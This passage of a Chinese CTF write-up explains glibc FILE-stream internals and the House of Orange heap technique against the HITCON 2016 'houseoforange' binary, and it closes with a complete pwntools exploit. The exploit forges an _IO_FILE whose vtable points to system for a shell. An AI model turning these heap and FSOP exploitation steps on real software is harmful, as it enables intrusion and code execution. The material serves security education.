      <span class="token keyword">if</span> <span class="token punctuation">(</span>more <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">*</span>s<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span>
      more<span class="token operator">--</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token keyword">return</span> n <span class="token operator">-</span> more<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>_IO_default_xsputn<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br></div></div><p>​    可以看到函数最主要的作用就是将剩余的目标输出数据拷贝到输出缓冲区里。为了性能优化，当长度大于20时，使用memcpy拷贝，当长度小于20时，使用for循环赋值拷贝。如果输出缓冲区为空，则调用_IO_OVERFLOW进行输出。</p> <p>​    根据源码可知，示例程序最终会进入_IO_default_xsputn中，并且把数据拷贝到输出缓冲区里，执行完成后，看到IO_FILE结构体的数据如下。</p> <p><img src="/images/heap/image-20211226165152025.png" alt="image-20211226165152025"></p> <p>​    可以看到此时的_IO_write_base为0x602270，而_IO_write_ptr为0x602290，大小正好是0x20。至此，源码分析结束。</p> <h2 id="house-of-orange"><a href="https://files.buuoj.cn/files/0bb7a5f7f7e032c913ba3c373e7cf88e/houseoforange_hitcon_2016?token=eyJ1c2VyX2lkIjo4ODY0LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyOTh9.YNHWEQ.yi3I-oRWIrGXpwwQlb5mSz121MM" target="_blank" rel="noopener noreferrer">house of orange<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="#house-of-orange" class="header-anchor">#</a></h2> <h3 id="前置知识">前置知识 <a href="#前置知识" class="header-anchor">#</a></h3> <p>​    FSOP: File Stream Oriented Programming</p> <p>​    当malloc_printer时有以下调用关系</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>__libc_malloc <span class="token operator">=</span><span class="token operator">&gt;</span> malloc_printerr <span class="token operator">=</span><span class="token operator">&gt;</span> __libc_message <span class="token operator">=</span><span class="token operator">&gt;</span> abort <span class="token operator">=</span><span class="token operator">&gt;</span> _IO_flush_all_lockp
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token comment">/* Flush all streams.  We cannot close them now because the user
   might have registered a handler for SIGABRT.  */</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>stage <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token operator">++</span>stage<span class="token punctuation">;</span>
    <span class="token function">fflush</span> <span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//abort中刷新了stream</span>
  <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;libio/libioP.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">fflush</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token function">_IO_flush_all_lockp</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span>

_IO_flush_all_lockp <span class="token operator">-&gt;</span> <span class="token function">JUMP_FILE</span><span class="token punctuation">(</span>_IO_OVERFLOW<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>House of orange的原理就是调用malloc时，利用unsorted bin中错误的fd/bk指针，触发malloc_printer函数打印错误信息，malloc_printer调用__libc_message，_<em>libc_message调用abort()，abort()调用_IO_flush_all_lockp。</em></p> <p>在_IO_flush_all_lockp中，通过对链表结构_IO_list_all中每个节点进行遍历，找到符合条件的节点，执行_IO_OVERWRITE函数，其中特点是_IO_FILE_PLUS类型的结构体，对函数的查找需要通过vtable定位函数表。如果我们可以劫持IO表中的_IO_OVERFLOW就可以getshell。</p> <h3 id="程序分析">程序分析 <a href="#程序分析" class="header-anchor">#</a></h3> <p>checksec查看程序保护。</p> <p><img src="/images/heap/image-20211226165525072.png" alt="image-20211226165525072"></p> <p>​     漏洞点在于一开始申请堆块时候是按照输入的size做malloc，而edit的时候也输入的新的size但没有验证合法性，造成堆溢出。</p> <p><img src="/images/heap/image-20211226165554877.png" alt="image-20211226165554877"></p> <p>​    其他函数都没啥问题，而且打印堆块内容的函数，泄露libc困难。</p> <h3 id="调试过程">调试过程 <a href="#调试过程" class="header-anchor">#</a></h3> <p>​     要完成利用的第一步通常就是泄露libc基址，这里可以通过堆溢出修改top chunk的size，让其进入unsorted bin中，然后切割泄露libc基址。但是需要注意的是：</p> <ol><li><p>伪造的size必须要对齐到内存页</p></li> <li><p>Size要大于MINSIZE(0x10)</p></li> <li><p>Size要小于之后申请的chunk size + MINSIZE(0x10)</p></li> <li><p>Size的prev_inuse位必须为1</p></li></ol> <div class="language-python line-numbers-mode"><pre class="language-python"><code>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'verf1sh'</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfa1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 通过溢出修改top chunk的size为0xfa1</span>
add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">'verf1sh'</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 申请一个大于此时topchunk的size，使top chunk掉入unsortbin</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>​    执行完add(0x10, 'verf1sh', 0x10, 1)，已经有三个堆块了。</p> <p><img src="/images/heap/image-20211226165643619.png" alt="image-20211226165643619"></p> <p>​    这时，通过编辑堆块功能处的堆溢出漏洞将top chunk的size改小。</p> <p><img src="/images/heap/image-20211226165650056.png" alt="image-20211226165650056"></p> <p><img src="/images/heap/image-20211226165655434.png" alt="image-20211226165655434"></p> <p>​    这时候再通过add(0x1000, 'verf1sh', 0x10, 1)申请一个大小大于top chunk的堆块，堆管理器就会使用brk拓展堆，并将原来的top chunk释放到unsorted bin中。这样我们就构造处了一个处于unsorted bin的堆块。</p> <p><img src="/images/heap/image-20211226165700782.png" alt="image-20211226165700782"></p> <p>​    再add一次大chunk，就会从unsorted bin里切割，可以show出libc的地址。同时，如果这个chunk是large chunk，在fd_nextsize和bd_nextsize中还会存储堆的地址，由此就可以完成信息泄露。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># leak libc_base</span>
add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1640</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
success<span class="token punctuation">(</span><span class="token string">'libc_base -&gt; {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
_IO_list_all <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

<span class="token comment"># leak heap_base</span>
edit<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>
heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffff000</span>
success<span class="token punctuation">(</span><span class="token string">'heap_base -&gt; {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>​    执行完add(0x400, 'a'*8, 0x10, 1)，获取到的chunk如下图所示。</p> <p><img src="/images/heap/image-20211226165723713.png" alt="image-20211226165723713">接下来就是涉及IO_FILE的利用了，就是前置知识中讲提及的FSOP（File Stream Oriented Programming)。关于IO_FILE的概念在前面讲解fopen、fread和fwrite的时候已经介绍过了，这里再复习一下。</p> <p>​    每个FILE结构体都通过一个_IO_FILE_plus结构体定义。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span>
<span class="token punctuation">{</span>
  _IO_FILE file<span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>​    其中包括一个IO_FILE结构体和一个vtable虚表指针。</p> <p>​    根据house of orange的流程，下面就是利用unsorted bin attack来修改_IO_list_all指针的值。unsorted bin attack在上次实验中已经介绍过了，简单来说就是在malloc的过程中，unsorted bin会从链表上卸下来，将其中最后一个chunk取出，并把倒数第二个chunk的fd设置为unsortedbin_chunk(av)的地址其实就是(&amp;main_arena+88)，而此时我们将unsorted bin中的chunk的bk改成_IO_list_all-0x10，这样从unsorted bin中取出它时，就可以成功将_IO_list_all改写为&amp;main_arena+88了。</p> <p>​    前面说过在malloc出错时会调用malloc_printer函数来输出错误信息，其最终调用的函数其实就是vtable中的_IO_OVERFLOW函数。所以如果可以控制_IO_list_all 的值，同时伪造一个IO_FILE和vtable并放入FILE链表中，就可以让malloc_printer打印错误信息时进入我们伪造vtable，将_IO_OVERFLOW函数篡改为system，那么就会调用system函数了。</p> <p>​    但是想要成功调用_IO_OVERFLOW函数还需要绕过一些阻碍。</p> <p><img src="/images/heap/image-20211226165745670.png" alt="image-20211226165745670"></p> <p>​    观察代码发现，_IO_OVERFLOW存在于if之中，若要执行到_IO_OVERFLOW，就需要让前面的判断都能满足，即：</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>fp<span class="token operator">-&gt;</span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">&gt;</span> fp<span class="token operator">-&gt;</span>_IO_write_base
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>或者</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fp<span class="token operator">-&gt;</span>_mode <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token operator">&gt;</span> fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_base<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>​    以上条件至少要满足一个，这里我们选择第一个，只需构造mode、_IO_write_ptr和_IO_write_base。因为这些都是我们可以伪造的_IO_FILE中的数据，所以比较容易实现。</p> <p>​    在前面介绍的unsortedbin attack可以将_IO_list_all指针的值修改为&amp;main_arena+88。但这还不够，因为我们很难控制main_arena中的数据，并不能在mode、_IO_write_ptr和_IO_write_base的对应偏移处构造出合适的值。</p> <p>所以我们将目光转向_IO_FILE的链表特性。在前文_IO_flush_all_lockp函数的代码最后，可以发现程序通过fp = fp-&gt;_chain不断的寻找下一个_IO_FILE。</p> <p><img src="/images/heap/image-20211226165822872.png" alt="image-20211226165822872"></p> <p>​    所以如果可以修改fp-&gt;_chain到一个我们伪造好的_IO_FILE的地址，那么就可以成功实现利用了。</p> <p>​    巧妙的是，_IO_FILE结构中的chain字段对应偏移是0x68，而在&amp;main_arena+88对应偏移为0x68的地址正好是大小为0x60的small bin的bk，而这个地址的刚好是我们可以控制的。</p> <p>​    如果通过溢出，将位于unsorted bin中的chunk的size修改为0x61。那么在下一次malloc的时候，因为在其他bin中都没有合适的chunk，malloc将会进入大循环，把unsorted bin中的chunk放回到对应的small bin或large bin中。</p> <p>​    因此，我们将位于unsorted bin中的chunk的size修改为0x61，因此该chunk就会被放入大小为0x60的small bin中，同时，该small bin的fd和bk都会变为此chunk的地址。</p> <p>​    这样，当_IO_flush_all_lockp函数通过fp-&gt;_chain寻找下一个_IO_FILE时，就会寻找到smallbin 0x60中的chunk。只要在这个chunk中伪造好_IO_FILE结构体以及vtable，把_IO_OVERFLOW设置为system，然后就可以成功getshell了。</p> <p>这样，当_IO_flush_all_lockp函数通过fp-&gt;_chain寻找下一个_IO_FILE时，就会寻找到smallbin 0x60中的chunk。</p> <p><img src="/images/heap/image-20211226165831107.png" alt="image-20211226165831107"></p> <p>​    而这时就到了我们伪造的_IO_FILE处，我们已经把伪造的IO_FILE结构体的vtable表中偏移为3出的__overflow函数已经被篡改为system了。</p> <p><img src="/images/heap/image-20211226165837432.png" alt="image-20211226165837432"></p> <p>​    这些unsorted bin attack和FSOP的操作都是在最后执行malloc(0x10)的时候完成的。</p> <p>​    至此整个调试过程分析完毕。</p> <h3 id="完整exp">完整exp <a href="#完整exp" class="header-anchor">#</a></h3> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
binary <span class="token operator">=</span> <span class="token string">'./houseoforange_hitcon_2016'</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
local <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
 p <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
 p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> name<span class="token punctuation">,</span> price<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">:</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>price<span class="token punctuation">)</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span> name<span class="token punctuation">,</span> price<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">:</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>price<span class="token punctuation">)</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#gdb.attach(p)</span>


add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'verf1sh'</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>

edit<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfa1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">'verf1sh'</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># leak libc_base</span>
add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1640</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
success<span class="token punctuation">(</span><span class="token string">'libc_base -&gt; {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
_IO_list_all <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

<span class="token comment"># leak heap_base</span>
edit<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>
heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffff000</span>
success<span class="token punctuation">(</span><span class="token string">'heap_base -&gt; {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>

<span class="token comment"># fsop</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x400</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x1f</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
fake_file <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>_IO_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#_IO_write_base &lt; _IO_write_ptr</span>
fake_file <span class="token operator">=</span> fake_file<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x5c8</span><span class="token punctuation">)</span> <span class="token comment">#vtable ptr</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span>
fake_file <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> fake_file
edit<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>

